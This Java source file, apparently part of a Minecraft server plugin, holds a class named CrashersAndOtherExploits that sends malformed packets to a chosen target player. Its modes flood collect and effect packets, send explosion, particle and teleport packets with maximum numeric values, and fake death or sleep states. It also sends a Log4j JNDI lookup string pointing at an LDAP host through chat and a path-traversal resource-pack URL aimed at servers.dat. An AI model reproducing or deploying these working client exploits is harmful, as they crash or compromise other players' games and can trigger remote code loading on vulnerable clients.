package me.killstorm103.Rebug.Utils;

import java.util.ArrayList;

import org.bukkit.entity.Player;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerWorldBorder;

import io.netty.buffer.Unpooled;
import me.killstorm103.Rebug.Main.Rebug;
import net.minecraft.server.v1_8_R3.BlockPosition;
import net.minecraft.server.v1_8_R3.ChatComponentText;
import net.minecraft.server.v1_8_R3.EntityPlayer;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.MobEffect;
import net.minecraft.server.v1_8_R3.PacketDataSerializer;
import net.minecraft.server.v1_8_R3.PacketPlayOutBed;
import net.minecraft.server.v1_8_R3.PacketPlayOutChat;
import net.minecraft.server.v1_8_R3.PacketPlayOutCollect;
import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityEffect;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityMetadata;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityStatus;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;
import net.minecraft.server.v1_8_R3.PacketPlayOutNamedEntitySpawn;
import net.minecraft.server.v1_8_R3.PacketPlayOutPlayerInfo;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.PacketPlayOutResourcePackSend;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import net.minecraft.server.v1_8_R3.Vec3D;

public class CrashersAndOtherExploits
{
	public static CrashersAndOtherExploits INSTANCE = new CrashersAndOtherExploits();
	
	// TODO Make Crash Using ChatColor strip
	public String NullPointerString ()
	{
		return null;
	}
	public void CrashSendPacket (Player attacker, Player target, String mode, String spawncrashmode)
	{
		if (attacker == null || target == null) return;
		
		if (mode.equalsIgnoreCase("Server")) // Test in dev
		{
			for (int i = 0; i < Integer.MAX_VALUE; i ++)
			PT.SendPacket(target, new PacketPlayOutCollect(target.getEntityId(), Integer.MAX_VALUE));
			PT.Log(attacker, "trying Server Crasher!");
			return;
		}
		if (mode.equalsIgnoreCase("Test"))
		{
			WrapperPlayServerWorldBorder p = new WrapperPlayServerWorldBorder(target.getLocation().getX(), target.getLocation().getBlockZ());
			PacketEvents.getAPI().getPlayerManager().sendPacket(target, p);
			/*
			ItemStack item = Reset(new ItemStack(Material.ANVIL, 1));
			itemMeta.setDisplayName(ChatColor.DARK_RED + "Crash Anvil!");
			item.setItemMeta(itemMeta);
			player.setItemInHand(item);
			player.updateInventory();
			PT.PlaceItem(player, player.getItemInHand(), new BlockPosition(player.getLocation().getBlockX(), player.getLocation().getBlockY(), player.getLocation().getBlockZ()), EnumDirection.UP, .5F, 0F, .5F);
			
			*/
			PT.Log(attacker, "tried crashing " + target.getName() + " with test");
			return;
		}
		if (mode.equalsIgnoreCase("NumbWare"))
		{
			PT.SendPacket(target, new PacketPlayOutCustomPayload("NWS|Crash Bed",
				    new PacketDataSerializer(Unpooled.buffer())));
		}
		if (mode.equalsIgnoreCase("Explosion"))
		{
            PT.SendPacket(target, new PacketPlayOutExplosion(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ())));
		}
		if (mode.equalsIgnoreCase("Particle"))
		{
			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
			
            for (int i = 0; i < EnumParticle.values().length; i ++)
            {
                PT.SendPacket(target, new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0}));
            }
		}
		if (mode.equalsIgnoreCase("GameState"))
		{
			PT.SendPacket(target, new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500))));
		}
		if (mode.equalsIgnoreCase("Log4j"))
		{
			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
			PT.SendPacket(target, new PacketPlayOutChat (text, (byte) 1));
		}
		if (mode.equalsIgnoreCase("illegal Position"))
		{
			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
			{
				PT.SendPacket(target, new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i)));
			}
		}
		if (mode.equalsIgnoreCase("illegal Effect"))
		{
			for (int i = 0; i < Integer.MAX_VALUE; i++)
				PT.SendPacket(target, new PacketPlayOutEntityEffect (target.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true)));
			
		}
		if (mode.equalsIgnoreCase("SpawnEntity"))
		{
			PT.CrashPlayer(attacker, target, spawncrashmode);
			PT.Log(attacker, Rebug.RebugMessage + "tried using the " + mode + " " + spawncrashmode + " Crash Exploit on " + target.getName());
			return;
		}
		if (mode.equalsIgnoreCase("ResourcePack"))
		{
			PT.SendPacket(target, new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat"));
		}
		PT.Log(attacker, Rebug.RebugMessage + "tried using the " + mode + " Crash Exploit on " + target.getName());
	}
	public void ExploitSendPacket (Player attcter, Player target, String exploit)
	{
		if (attcter == null || target == null) return;
		User user = Rebug.getUser(target);
		if (user == null) return;
		EntityPlayer px = PT.getEntityPlayer(target);
		if (px == null) return;
		
		if (exploit.equalsIgnoreCase("ResourcePack"))
		{
			target.setResourcePack("level://../servers.dat");
		}
		if (exploit.equalsIgnoreCase("force sleep"))
		{
			PT.SendPacket(target, new PacketPlayOutBed(PT.getEntityPlayer(target), new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
		}
		if (exploit.equalsIgnoreCase("demo"))
		{
			PT.SendPacket(target, new PacketPlayOutGameStateChange(5, 0));
		}
		if (exploit.equalsIgnoreCase("fake death")) 
		{
			PT.SendPacket(target, new PacketPlayOutEntityStatus(PT.getEntityPlayer(target), (byte) 3));
		}
		if (exploit.equalsIgnoreCase("Test"))
		{
			TeleportUtils.GenerateCrashLocation(target);
		}
		if (exploit.equalsIgnoreCase("Spawn Player"))
		{
			user.CancelInteract = true;
			user.Exterranl_Damage = false;
			user.FallDamage = false;
			user.Hunger = false;
			target.setNoDamageTicks(Integer.MAX_VALUE);
			px.setInvisible(true);
			PT.SendPacket(target, new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER, px));
			PT.SendPacket(target, new PacketPlayOutEntityMetadata(px.getId(), px.getDataWatcher(), true));
			PT.SendPacket(target, new PacketPlayOutNamedEntitySpawn(PT.getEntityHuman(target)));
		}
		
		PT.Log(attcter, Rebug.RebugMessage + "tried using the " + exploit + " Exploit on " + target.getName());
	}
}
